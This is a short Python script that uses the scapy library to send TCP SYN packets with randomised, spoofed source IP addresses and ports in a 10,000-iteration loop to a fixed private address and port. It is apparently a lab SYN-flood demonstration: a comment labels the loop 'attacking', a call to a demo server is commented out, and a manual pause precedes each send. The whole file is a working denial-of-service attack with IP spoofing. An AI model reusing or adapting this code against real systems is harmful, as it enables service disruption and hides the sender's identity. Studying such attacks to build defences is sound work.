import threading
from random import randint

from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send, sniff
from scapy.volatile import RandIP, RandShort

from three_way_handshake_handlers import handle_syn_ack


def generate_random_ip():
    ip_octets = [str(randint(0, 255)) for _ in range(4)]
    random_ip = ".".join(ip_octets)
    return random_ip

def main():
    # All constants
    DST_PORT = 9900
    DST_IP = "192.168.1.101"
    # PAYLOAD = "sorry"*42
    LOOP_SIZE = 10000

    # run_demo_server(DST_PORT)

    for _ in range(LOOP_SIZE):  # attacking
        spoofed_ip = generate_random_ip()
        spoofed_packet = IP(src=RandIP(), dst=DST_IP) / TCP(dport=DST_PORT, sport=RandShort(), flags="S")
        input("enter: ")
        send(spoofed_packet, verbose=0)


if __name__ == '__main__':
    main()
